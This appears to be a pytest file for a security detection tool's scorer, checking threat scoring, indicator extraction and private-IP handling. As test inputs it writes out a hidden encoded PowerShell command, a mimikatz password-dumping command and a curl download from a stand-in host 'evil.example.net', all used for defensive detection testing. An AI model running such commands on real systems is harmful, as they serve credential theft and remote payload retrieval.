"""Deterministic scorer tests."""

from __future__ import annotations

from tests.conftest import make_event
from vigil.pipeline.score import DeterministicScorer, ThreatIntel, extract_iocs, is_private_ip

EXAMPLE_MALICIOUS_HASH = "a" * 64  # clearly-marked example indicator


def test_encoded_powershell_scores_malicious():
    event = make_event(
        cmdline="powershell.exe -nop -w hidden -enc SQBFAFgA", dst_ip="45.45.45.45"
    )
    score, reasons, _ = DeterministicScorer().score(event)
    assert score >= 70
    assert any(r.kind == "rule_hit" for r in reasons)


def test_benign_office_activity_scores_low():
    event = make_event(
        process="chrome.exe",
        cmdline=r'"C:\Program Files\Google\Chrome\Application\chrome.exe" --profile-directory=Default',
        event_type="file_access",
        dst_ip="10.20.30.40",
    )
    score, reasons, _ = DeterministicScorer().score(event)
    assert score < 30
    assert any(r.kind == "event_field" for r in reasons)


def test_threat_intel_hash_hit_dominates():
    ti = ThreatIntel(malicious_hashes=frozenset({EXAMPLE_MALICIOUS_HASH}))
    event = make_event(file_hash=EXAMPLE_MALICIOUS_HASH, cmdline="normal.exe")
    score, reasons, _ = DeterministicScorer(ti).score(event)
    assert score >= 90
    assert any(r.kind == "ti_lookup" for r in reasons)


def test_mimikatz_rule_fires():
    event = make_event(cmdline="mimikatz.exe sekurlsa::logonpasswords")
    score, reasons, _ = DeterministicScorer().score(event)
    assert score >= 80
    assert any("mimikatz" in r.claim for r in reasons)


def test_system_account_network_action():
    event = make_event(
        user="SYSTEM", event_type="network_connection", cmdline="net.exe use",
        process="net.exe", dst_ip="45.45.45.45",
    )
    score, _, _ = DeterministicScorer().score(event)
    assert score >= 55


def test_extract_iocs_finds_indicators():
    event = make_event(
        cmdline="curl -o x http://evil.example.net/a 45.45.45.45", file_hash="b" * 64
    )
    iocs = extract_iocs(event)
    assert "45.45.45.45" in iocs
    assert "evil.example.net" in iocs
    assert "b" * 64 in iocs


def test_is_private_ip():
    assert is_private_ip("10.0.0.1")
    assert is_private_ip("192.168.1.1")
    assert is_private_ip("172.16.0.1")
    assert not is_private_ip("45.45.45.45")
    assert not is_private_ip(None)


def test_threat_intel_empty_when_file_missing(tmp_path):
    ti = ThreatIntel.from_file(tmp_path / "missing.json")
    assert ti == ThreatIntel.empty()
